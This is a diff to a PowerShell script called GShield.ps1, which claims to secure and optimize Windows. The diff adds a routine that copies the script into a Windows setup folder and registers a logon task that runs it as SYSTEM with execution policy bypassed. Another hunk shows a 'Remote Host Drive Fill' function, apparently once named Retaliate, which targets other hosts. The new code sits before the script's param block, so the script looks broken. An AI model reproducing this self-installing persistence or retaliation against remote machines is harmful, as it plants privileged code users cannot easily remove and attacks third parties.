@@ -1,8 +1,57 @@
 ﻿#Requires -RunAsAdministrator
-# GShield.ps1
-# Consolidated Windows security and optimization script
-# Author: Gorstak, optimized by Grok
-# Description: Comprehensive script for securing and optimizing Windows systems, including web server and VM termination
+# GShield.ps1 by Gorstak
+
+function Register-SystemLogonScript {
+    param (
+        [string]$TaskName = "RunGShieldAtLogon"
+    )
+
+    # Define paths
+    $scriptSource = $MyInvocation.MyCommand.Path
+    if (-not $scriptSource) {
+        # Fallback to determine script path
+        $scriptSource = $PSCommandPath
+        if (-not $scriptSource) {
+            Write-Output "Error: Could not determine script path."
+            return
+        }
+    }
+
+    $targetFolder = "C:\Windows\Setup\Scripts\Bin"
+    $targetPath = Join-Path $targetFolder (Split-Path $scriptSource -Leaf)
+
+    # Create required folders
+    if (-not (Test-Path $targetFolder)) {
+        New-Item -Path $targetFolder -ItemType Directory -Force | Out-Null
+        Write-Output "Created folder: $targetFolder"
+    }
+
+    # Copy the script
+    try {
+        Copy-Item -Path $scriptSource -Destination $targetPath -Force -ErrorAction Stop
+        Write-Output "Copied script to: $targetPath"
+    } catch {
+        Write-Output "Failed to copy script: $_"
+        return
+    }
+
+    # Define the scheduled task action and trigger
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$targetPath`""
+    $trigger = New-ScheduledTaskTrigger -AtLogOn
+    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+
+    # Register the task
+    try {
+        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
+        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal
+        Write-Output "Scheduled task '$TaskName' created to run at user logon under SYSTEM."
+    } catch {
+        Write-Output "Failed to register task: $_"
+    }
+}
+
+# Run the function
+Register-SystemLogonScript
 
 param (
     [switch]$Monitor,
@@ -1778,8 +1827,8 @@ function Invoke-NetworkDebloat {
 
 # Remote Host Drive Fill
 function Invoke-FillRemoteHostDrive {
-    $taskName = "RunRetaliateAtLogon"
-    $taskScriptPath = "C:\Windows\Setup\Scripts\Bin\Retaliate.ps1"
+    $taskName = "RunGShieldAtLogon"
+    $taskScriptPath = "C:\Windows\Setup\Scripts\Bin\GShield.ps1"
     $whitelistIPs = @("192.168.1.100", "10.0.0.50") # Replace with authorized IPs
     
     try {
